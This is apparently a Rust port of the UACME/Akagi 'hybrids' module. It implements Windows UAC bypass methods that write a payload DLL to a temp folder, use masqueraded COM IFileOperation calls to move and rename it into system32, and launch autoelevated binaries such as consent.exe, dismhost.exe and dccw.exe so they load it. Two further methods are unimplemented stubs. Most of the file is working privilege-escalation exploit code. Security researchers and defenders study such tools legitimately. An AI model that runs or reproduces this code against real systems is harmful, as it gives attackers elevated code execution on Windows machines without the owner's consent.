// Hybrid UAC bypass methods
// Port of Source/Akagi/methods/hybrids.c

use crate::context::*;
use crate::methods::*;
use shared::*;
use windows::core::PCWSTR;
use windows::Win32::Foundation::*;
use windows::Win32::System::Threading::*;
use windows::Win32::Storage::FileSystem::*;

/// Method 22: SXS Consent
/// Exploit SXS Local Redirect feature
/// Works on Windows 7 - Windows 10 RS1
pub fn method_sxs_consent(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 22] SXS Consent");
    
    // Get payload DLL
    let payload_dll = match &params.payload_code {
        Some(dll) => dll,
        None => {
            log::error!("No payload DLL provided");
            return constants::STATUS_INVALID_PARAMETER;
        }
    };
    
    // Target application: consent.exe
    let consent_exe = format!("{}consent.exe", from_wide_string(&ctx.system_directory));
    let target_dll = "comctl32.dll";
    
    // Use generic autoelevation method
    generic_autoelevation(
        ctx,
        Some(&consent_exe),
        target_dll,
        payload_dll,
        None,
    )
}

/// Method 23: DISM
/// Exploit DISM autoelevation
/// Works on Windows 7 - Windows 10 RS1
pub fn method_dism(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 23] DISM");
    
    let payload_dll = match &params.payload_code {
        Some(dll) => dll,
        None => {
            log::error!("No payload DLL provided");
            return constants::STATUS_INVALID_PARAMETER;
        }
    };
    
    // Target: dismhost.exe
    let dism_exe = format!("{}dism\\dismhost.exe", from_wide_string(&ctx.system_directory));
    let target_dll = "LogProvider.dll";
    
    generic_autoelevation(
        ctx,
        Some(&dism_exe),
        target_dll,
        payload_dll,
        Some("dism\\"),
    )
}

/// Method 32: UI Access
/// Obtain token from UIAccess application and modify it
pub fn method_ui_access(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 32] UI Access");
    
    let payload_dll = match &params.payload_code {
        Some(dll) => dll,
        None => {
            log::error!("No payload DLL provided");
            return constants::STATUS_INVALID_PARAMETER;
        }
    };
    
    // This method requires token manipulation
    // For now, return not implemented
    log::warn!("UI Access method requires token manipulation - not fully implemented");
    constants::STATUS_NOT_IMPLEMENTED
}

/// Method 36: Junction
/// Use WUSA race condition with NTFS reparse points
pub fn method_junction(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 36] Junction");
    
    let payload_dll = match &params.payload_code {
        Some(dll) => dll,
        None => {
            log::error!("No payload DLL provided");
            return constants::STATUS_INVALID_PARAMETER;
        }
    };
    
    // Junction method is complex - requires WUSA race condition
    log::warn!("Junction method requires WUSA race condition - not fully implemented");
    constants::STATUS_NOT_IMPLEMENTED
}

/// Method 37: SXS Dccw
/// SXS method targeting dccw.exe
pub fn method_sxs_dccw(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 37] SXS Dccw");
    
    let payload_dll = match &params.payload_code {
        Some(dll) => dll,
        None => {
            log::error!("No payload DLL provided");
            return constants::STATUS_INVALID_PARAMETER;
        }
    };
    
    // Target: dccw.exe (Display Color Calibration)
    let dccw_exe = format!("{}dccw.exe", from_wide_string(&ctx.system_directory));
    let target_dll = "GdiPlus.dll";
    
    generic_autoelevation(
        ctx,
        Some(&dccw_exe),
        target_dll,
        payload_dll,
        None,
    )
}

/// Generic autoelevation helper
/// Bypass UAC by abusing autoelevated system32 application via missing DLL
fn generic_autoelevation(
    ctx: &mut UacmeContext,
    target_app: Option<&str>,
    target_dll: &str,
    proxy_dll: &[u8],
    sub_directory: Option<&str>,
) -> MethodResult {
    use std::fs;
    use std::path::Path;
    
    // Build source path (temp directory)
    let temp_dir = from_wide_string(&ctx.temp_directory);
    let source_path = format!("{}{}_", temp_dir, target_dll);
    
    // Write proxy DLL to temp
    if let Err(e) = fs::write(&source_path, proxy_dll) {
        log::error!("Failed to write proxy DLL: {}", e);
        return constants::STATUS_ACCESS_DENIED;
    }
    
    // Build destination path (system32)
    let sys_dir = from_wide_string(&ctx.system_directory);
    let dest_dir = if let Some(subdir) = sub_directory {
        format!("{}{}", sys_dir, subdir)
    } else {
        sys_dir.clone()
    };
    
    // Use COM to move file to system32 (requires elevation bypass)
    // This is the core of the bypass - using IFileOperation COM interface
    if !masqueraded_move_file_com(&source_path, &dest_dir) {
        log::error!("Failed to move file to system32");
        fs::remove_file(&source_path).ok();
        return constants::STATUS_ACCESS_DENIED;
    }
    
    // Rename file to target DLL name
    let dest_path_temp = format!("{}{}_", dest_dir, target_dll);
    let dest_path_final = format!("{}{}", dest_dir, target_dll);
    
    if !masqueraded_rename_element_com(&dest_path_temp, target_dll) {
        log::error!("Failed to rename DLL");
        cleanup_single_item_system32(target_dll, sub_directory);
        return constants::STATUS_ACCESS_DENIED;
    }
    
    // Run target application if specified
    if let Some(app) = target_app {
        log::info!("Launching target application: {}", app);
        
        match winapi_ext::create_process_simple(&to_wide_string(app), None, 1) {
            Ok(pi) => {
                unsafe {
                    // Wait a bit for DLL to load
                    std::thread::sleep(std::time::Duration::from_secs(5));
                    
                    let _ = CloseHandle(pi.hProcess);
                    let _ = CloseHandle(pi.hThread);
                }
                
                // Cleanup
                cleanup_single_item_system32(target_dll, sub_directory);
                
                constants::STATUS_SUCCESS
            }
            Err(e) => {
                log::error!("Failed to launch target app: {}", e);
                cleanup_single_item_system32(target_dll, sub_directory);
                constants::STATUS_ACCESS_DENIED
            }
        }
    } else {
        constants::STATUS_SUCCESS
    }
}

/// Cleanup single item from system32
fn cleanup_single_item_system32(item_name: &str, sub_directory: Option<&str>) -> bool {
    // Build full path
    let sys_dir = query_system_directory(true);
    let sys_dir_str = from_wide_string(&sys_dir);
    
    let full_path = if let Some(subdir) = sub_directory {
        format!("{}{}{}", sys_dir_str, subdir, item_name)
    } else {
        format!("{}{}", sys_dir_str, item_name)
    };
    
    // Use COM to delete file
    masqueraded_delete_directory_file_com(&full_path)
}

/// Move file using COM IFileOperation (bypasses UAC)
fn masqueraded_move_file_com(source: &str, destination: &str) -> bool {
    match com_helper::file_operation_move(source, destination) {
        Ok(_) => {
            log::info!("Successfully moved file via COM");
            true
        }
        Err(e) => {
            log::error!("Failed to move file via COM: {}", e);
            false
        }
    }
}

/// Rename element using COM IFileOperation
fn masqueraded_rename_element_com(source: &str, new_name: &str) -> bool {
    match com_helper::file_operation_rename(source, new_name) {
        Ok(_) => {
            log::info!("Successfully renamed file via COM");
            true
        }
        Err(e) => {
            log::error!("Failed to rename file via COM: {}", e);
            false
        }
    }
}

/// Delete file using COM IFileOperation
fn masqueraded_delete_directory_file_com(path: &str) -> bool {
    match com_helper::file_operation_delete(path) {
        Ok(_) => {
            log::info!("Successfully deleted file via COM");
            true
        }
        Err(e) => {
            log::error!("Failed to delete file via COM: {}", e);
            false
        }
    }
}

